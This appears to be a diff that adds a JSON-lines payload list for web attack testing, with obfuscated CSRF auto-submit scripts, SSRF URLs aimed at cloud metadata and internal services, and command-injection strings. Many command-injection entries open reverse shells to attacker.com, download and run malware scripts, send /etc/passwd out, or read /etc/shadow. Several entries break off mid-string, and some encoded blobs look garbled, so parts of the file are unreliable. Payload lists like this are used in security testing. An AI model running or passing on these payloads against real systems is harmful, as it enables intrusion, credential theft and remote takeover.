+{"id": "csrf-082", "payload": "<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>"}
+{"id": "csrf-083", "payload": "<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=\\"}
+{"id": "csrf-084", "payload": "<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"}
+{"id": "csrf-085", "payload": "<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(\\"}
+{"id": "csrf-086", "payload": "<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>"}
+{"id": "csrf-087", "payload": "<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"}
+{"id": "csrf-088", "payload": "<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=\\"}
+{"id": "csrf-089", "payload": "<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"}
+{"id": "csrf-090", "payload": "<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=\\"}
+{"id": "csrf-091", "payload": "<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>"}
+{"id": "csrf-092", "payload": "<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>"}
+{"id": "csrf-093", "payload": "<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>"}
+{"id": "csrf-094", "payload": "<a href=\\"}
+{"id": "csrf-095", "payload": "<img src='invalid.jpg' onerror=\\"}
+{"id": "csrf-096", "payload": "<script>var a=\\\\u0064\\\\u006f\\\\u0063\\\\u0075\\\\u006d\\\\u0065\\\\u006e\\\\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"}
+{"id": "csrf-097", "payload": "<div style=\\"}
+{"id": "csrf-098", "payload": "<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>"}
+{"id": "csrf-099", "payload": "<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>"}
+{"id": "csrf-100", "payload": "<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"}
+{"id": "ssrf-001", "payload": "http://127.0.0.1/"}
+{"id": "ssrf-002", "payload": "http://192.168.1.1/"}
+{"id": "ssrf-003", "payload": "http://169.254.169.254/latest/meta-data/"}
+{"id": "ssrf-004", "payload": "http://metadata.google.internal/computeMetadata/v1/"}
+{"id": "ssrf-005", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
+{"id": "ssrf-006", "payload": "redis://127.0.0.1:6379"}
+{"id": "ssrf-007", "payload": "memcached://127.0.0.1:11211"}
+{"id": "ssrf-008", "payload": "ftp://127.0.0.1/"}
+{"id": "ssrf-009", "payload": "smb://192.168.1.100/share"}
+{"id": "ssrf-010", "payload": "http://127.0.0.1:2375/containers/json"}
+{"id": "ssrf-011", "payload": "https://kubernetes.default.svc/api"}
+{"id": "ssrf-012", "payload": "http://127.0.0.1:8080/api/json"}
+{"id": "ssrf-013", "payload": "http://127.0.0.1:9200/_cat/indices?v"}
+{"id": "ssrf-014", "payload": "http://127.0.0.1:15672/api/overview"}
+{"id": "ssrf-015", "payload": "mysql://127.0.0.1:3306"}
+{"id": "ssrf-016", "payload": "postgresql://127.0.0.1:5432"}
+{"id": "ssrf-017", "payload": "smtp://127.0.0.1:25"}
+{"id": "ssrf-018", "payload": "snmp://127.0.0.1"}
+{"id": "ssrf-019", "payload": "ldap://127.0.0.1:389"}
+{"id": "ssrf-020", "payload": "http://127.0.0.1/../../../../etc/passwd"}
+{"id": "ssrf-021", "payload": "http://%31%39%32.%31%36%38.%31.%31/"}
+{"id": "ssrf-022", "payload": "http://0300.0250.0001.0001/"}
+{"id": "ssrf-023", "payload": "http://3232235777/"}
+{"id": "ssrf-024", "payload": "http://[::1]/"}
+{"id": "ssrf-025", "payload": "file:///etc/passwd"}
+{"id": "ssrf-026", "payload": "gopher://127.0.0.1:6379/_SET%20key%201%0D%0A"}
+{"id": "ssrf-027", "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4="}
+{"id": "ssrf-028", "payload": "javascript:alert('SSRF')"}
+{"id": "ssrf-029", "payload": "file:///proc/self/environ"}
+{"id": "ssrf-030", "payload": "http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd"}
+{"id": "ssrf-031", "payload": "ftp://127.0.0.1/../../../../etc/passwd"}
+{"id": "ssrf-032", "payload": "smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts"}
+{"id": "ssrf-033", "payload": "http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a"}
+{"id": "ssrf-034", "payload": "http://127.0.0.1:80/\\r\\nX-Injected-Header: evil"}
+{"id": "ssrf-035", "payload": "http://admin:password@127.0.0.1/admin"}
+{"id": "ssrf-036", "payload": "http://external.com/redirect?url=http://127.0.0.1/"}
+{"id": "ssrf-037", "payload": "http://evil.com/"}
+{"id": "ssrf-038", "payload": "http://[::ffff:127.0.0.1]/"}
+{"id": "ssrf-039", "payload": "http://127.0.0.1/%0a%0d"}
+{"id": "ssrf-040", "payload": "http://127.0.0.1/?_method=POST"}
+{"id": "ssrf-041", "payload": "http://127.0.0.1/chunked"}
+{"id": "ssrf-042", "payload": "http://127.0.0.1/trace"}
+{"id": "ssrf-043", "payload": "http://127.0.0.1/options"}
+{"id": "ssrf-044", "payload": "http://127.0.0.1/connect"}
+{"id": "ssrf-045", "payload": "http://127.0.0.1/patch"}
+{"id": "ssrf-046", "payload": "http://127.0.0.1/delete"}
+{"id": "ssrf-047", "payload": "http://127.0.0.1/put"}
+{"id": "ssrf-048", "payload": "http://127.0.0.1/put"}
+{"id": "ssrf-049", "payload": "http://127.0.0.1/\\r\\nX-Forwarded-For: 127.0.0.1"}
+{"id": "ssrf-050", "payload": "http://127.0.0.1@evil.com/"}
+{"id": "ssrf-051", "payload": "dict://127.0.0.1/"}
+{"id": "ssrf-052", "payload": "telnet://127.0.0.1:23"}
+{"id": "ssrf-053", "payload": "ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid"}
+{"id": "ssrf-054", "payload": "rdp://127.0.0.1:3389"}
+{"id": "ssrf-055", "payload": "smb://127.0.0.1/share"}
+{"id": "ssrf-056", "payload": "nfs://127.0.0.1/export"}
+{"id": "ssrf-057", "payload": "imap://127.0.0.1:143"}
+{"id": "ssrf-058", "payload": "pop3://127.0.0.1:110"}
+{"id": "ssrf-059", "payload": "mqtt://127.0.0.1:1883"}
+{"id": "ssrf-060", "payload": "ws://127.0.0.1:8080/"}
+{"id": "ssrf-061", "payload": "wss://127.0.0.1:8443/"}
+{"id": "ssrf-062", "payload": "bitcoin://127.0.0.1/"}
+{"id": "ssrf-063", "payload": "magnet:?xt=urn:btih:abcdef1234567890"}
+{"id": "ssrf-064", "payload": "ssh://127.0.0.1:22"}
+{"id": "ssrf-065", "payload": "tel:+1234567890"}
+{"id": "ssrf-066", "payload": "sms:+1234567890"}
+{"id": "ssrf-067", "payload": "geo:37.786971,-122.399677"}
+{"id": "ssrf-068", "payload": "svn://127.0.0.1/repo"}
+{"id": "ssrf-069", "payload": "git://127.0.0.1/repo.git"}
+{"id": "ssrf-070", "payload": "sftp://127.0.0.1/home/user/"}
+{"id": "ssrf-071", "payload": "http://%2531%25327%2532%253E%253E%253E/"}
+{"id": "ssrf-072", "payload": "HtTp://127.0.0.1/"}
+{"id": "ssrf-073", "payload": "http://127.0.0.1%00.example.com/"}
+{"id": "ssrf-074", "payload": "http://127.0.0.1/\\r\\nSet-Cookie:evil=1"}
+{"id": "ssrf-075", "payload": "gopher://127.0.0.1:6379/_SET%20key%201%0D%0A"}
+{"id": "ssrf-076", "payload": "http://[::ffff:192.168.1.1]:8080/"}
+{"id": "ssrf-077", "payload": "http://evil.com/"}
+{"id": "ssrf-078", "payload": "http://127.0.0.1/%0d%0aX-Injected-Header:evil"}
+{"id": "ssrf-079", "payload": "http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a"}
+{"id": "ssrf-080", "payload": "file:///etc/passwd%00"}
+{"id": "ssrf-081", "payload": "http://admin%3Apassword@127.0.0.1/"}
+{"id": "ssrf-082", "payload": "http://external.com/redirect?url=http://127.0.0.1/"}
+{"id": "ssrf-083", "payload": "http://127.0.0.1/?_method=POST"}
+{"id": "ssrf-084", "payload": "http://127.0.0.1/chunked"}
+{"id": "ssrf-085", "payload": "http://127.0.0.1/trace"}
+{"id": "ssrf-086", "payload": "http://127.0.0.1/options"}
+{"id": "ssrf-087", "payload": "http://127.0.0.1/connect"}
+{"id": "ssrf-088", "payload": "http://127.0.0.1/patch"}
+{"id": "ssrf-089", "payload": "http://127.0.0.1/delete"}
+{"id": "ssrf-090", "payload": "http://127.0.0.1/put"}
+{"id": "ssrf-091", "payload": "http://0x7f.0x0.0x0.0x1/"}
+{"id": "ssrf-092", "payload": "http://127.1/"}
+{"id": "ssrf-093", "payload": "http://2130706433/"}
+{"id": "ssrf-094", "payload": "http://127.0.0.1@evil.com/"}
+{"id": "ssrf-095", "payload": "http://127.0.0.1/#fragment"}
+{"id": "ssrf-096", "payload": "http://127.0.0.1/?param=value"}
+{"id": "ssrf-097", "payload": "http://127.0.0.1/../../../../etc/passwd"}
+{"id": "ssrf-098", "payload": "http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd"}
+{"id": "ssrf-099", "payload": "http://127.0.0.1/%2f%2f/etc/passwd"}
+{"id": "ssrf-100", "payload": "http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd"}
+{"id": "cmdinj-001", "payload": "; ls -la"}
+{"id": "cmdinj-002", "payload": "&& cat /etc/passwd"}
+{"id": "cmdinj-003", "payload": "| whoami"}
+{"id": "cmdinj-004", "payload": "id"}
+{"id": "cmdinj-005", "payload": "$(uname -a)"}
+{"id": "cmdinj-006", "payload": "$(echo $(whoami))"}
+{"id": "cmdinj-007", "payload": "& sleep 10"}
+{"id": "cmdinj-008", "payload": "&& echo 'injected'\\n"}
+{"id": "cmdinj-009", "payload": "; curl http://attacker.com"}
+{"id": "cmdinj-010", "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh"}
+{"id": "cmdinj-011", "payload": "| nc attacker.com 4444 -e /bin/sh"}
+{"id": "cmdinj-012", "payload": "whoami"}
+{"id": "cmdinj-013", "payload": "$(id)"}
+{"id": "cmdinj-014", "payload": "; echo injected"}
+{"id": "cmdinj-015", "payload": "&& cat /etc/shadow"}
+{"id": "cmdinj-016", "payload": "; id"}
+{"id": "cmdinj-017", "payload": "| env"}
+{"id": "cmdinj-018", "payload": "ls /"}
+{"id": "cmdinj-019", "payload": "$(ps aux)"}
+{"id": "cmdinj-020", "payload": "; whoami"}
+{"id": "cmdinj-021", "payload": "%3B%20id"}
+{"id": "cmdinj-022", "payload": "`echo \\\\whoami\\\\`"}
+{"id": "cmdinj-023", "payload": "; echo $USER"}
+{"id": "cmdinj-024", "payload": "; echo\\x20injected"}
+{"id": "cmdinj-025", "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash"}
+{"id": "cmdinj-026", "payload": "$(sleep 10)"}
+{"id": "cmdinj-027", "payload": "; echo $(whoami)"}
+{"id": "cmdinj-028", "payload": "; echo injected\\\\; ls"}
+{"id": "cmdinj-029", "payload": "; ls -la && whoami || echo failed"}
+{"id": "cmdinj-030", "payload": "; (id; uname -a)"}
+{"id": "cmdinj-031", "payload": "; (sleep 5)"}
+{"id": "cmdinj-032", "payload": "; ls -la #"}
+{"id": "cmdinj-033", "payload": "echo $(whoami)"}
+{"id": "cmdinj-034", "payload": "; echo $PATH"}
+{"id": "cmdinj-035", "payload": "$(echo injected)"}
+{"id": "cmdinj-036", "payload": "; (echo injected; whoami)"}
+{"id": "cmdinj-037", "payload": "; sleep 15"}
+{"id": "cmdinj-038", "payload": "| nc attacker.com 4444 -e /bin/sh"}
+{"id": "cmdinj-039", "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh"}
+{"id": "cmdinj-040", "payload": "; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh"}
+{"id": "cmdinj-041", "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash"}
+{"id": "cmdinj-042", "payload": "; export MALICIOUS=1"}
+{"id": "cmdinj-043", "payload": "; echo 'malicious' > /tmp/malicious.txt"}
+{"id": "cmdinj-044", "payload": "; chmod +x /tmp/m.sh"}
+{"id": "cmdinj-045", "payload": "; cat /etc/shadow"}
+{"id": "cmdinj-046", "payload": "; echo 'injected; ls -la'"}
+{"id": "cmdinj-047", "payload": "; echo \\"}
+{"id": "cmdinj-048", "payload": "; awk 'BEGIN {system(\\"}
+{"id": "cmdinj-049", "payload": "; perl -e 'print id'"}
+{"id": "cmdinj-050", "payload": "; python -c 'import os; os.system(\\"}
+{"id": "cmdinj-051", "payload": "& whoami"}
+{"id": "cmdinj-052", "payload": "| dir"}
+{"id": "cmdinj-053", "payload": "&& ipconfig"}
+{"id": "cmdinj-054", "payload": "|| net user"}
+{"id": "cmdinj-055", "payload": "; Get-Process"}
+{"id": "cmdinj-056", "payload": "whoami"}
+{"id": "cmdinj-057", "payload": "$(Get-ChildItem)"}
+{"id": "cmdinj-058", "payload": "; Start-Process notepad.exe"}
+{"id": "cmdinj-059", "payload": "& echo injected > C:\\\\Windows\\\\Temp\\\\injected.txt"}
+{"id": "cmdinj-060", "payload": "& nc attacker.com 4444 -e cmd.exe"}
+{"id": "cmdinj-061", "payload": "; whoami"}
+{"id": "cmdinj-062", "payload": "| id"}
+{"id": "cmdinj-063", "payload": "&& uname -a"}
+{"id": "cmdinj-064", "payload": "ls /"}
+{"id": "cmdinj-065", "payload": "$(ps aux)"}
+{"id": "cmdinj-066", "payload": "; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh"}
+{"id": "cmdinj-067", "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh"}
+{"id": "cmdinj-068", "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash"}
+{"id": "cmdinj-069", "payload": "; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU="}
+{"id": "cmdinj-070", "payload": "& for /L %i in (1,1,5) do @echo %i"}
+{"id": "cmdinj-071", "payload": "; Invoke-Expression 'whoami'"}
+{"id": "cmdinj-072", "payload": "; env"}
+{"id": "cmdinj-073", "payload": "; cat /etc/passwd"}
+{"id": "cmdinj-074", "payload": "& reg query HKLM\\\\Software"}
+{"id": "cmdinj-075", "payload": "; Get-Content C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"}
+{"id": "cmdinj-076", "payload": "; dmesg"}
+{"id": "cmdinj-077", "payload": "; netstat -an"}
+{"id": "cmdinj-078", "payload": "& tasklist"}
+{"id": "cmdinj-079", "payload": "; Get-Service"}
+{"id": "cmdinj-080", "payload": "; ps aux"}
+{"id": "cmdinj-081", "payload": "& echo injected | findstr injected"}
+{"id": "cmdinj-082", "payload": "; Start-Process notepad.exe -WindowStyle Hidden"}
+{"id": "cmdinj-083", "payload": "; curl http://attacker.com/?data=$(cat /etc/passwd)"}
+{"id": "cmdinj-084", "payload": "& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA"}
+{"id": "cmdinj-085", "payload": "; nc attacker.com 4444 -e /bin/bash"}
+{"id": "cmdinj-086", "payload": "& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe"}
+{"id": "cmdinj-087", "payload": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}
+{"id": "cmdinj-088", "payload": "; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\\\\Windows\\\\Temp\\\\m.ps1; powershell -ExecutionPolicy Bypass -File C:\\\\Windows\\\\Temp\\\\m.ps1"}
+{"id": "cmdinj-089", "payload": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"}
+{"id": "cmdinj-090", "payload": "& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ=="}
+{"id": "cmdinj-091", "payload": "; e${IFS}cho injected"}
+{"id": "cmdinj-092", "payload": "; echo \\u0069\\u006E\\u006A\\u0065\\u0063\\u0074\\u0065\\u0064"}
+{"id": "cmdinj-093", "payload": "%253B%2520id"}
+{"id": "cmdinj-094", "payload": "; VAR=whoami; $VAR"}
+{"id": "cmdinj-095", "payload": "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash"}
+{"id": "cmdinj-096", "payload": "&& echo injected\\nid"}
+{"id": "cmdinj-097", "payload": "; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA"}
+{"id": "cmdinj-098", "payload": "; echo $(echo \\"}
+{"id": "cmdinj-099", "payload": "; export CMD=whoami; ${CMD}"}
+{"id": "cmdinj-100", "payload": "; awk 'BEGIN {system(\\"}
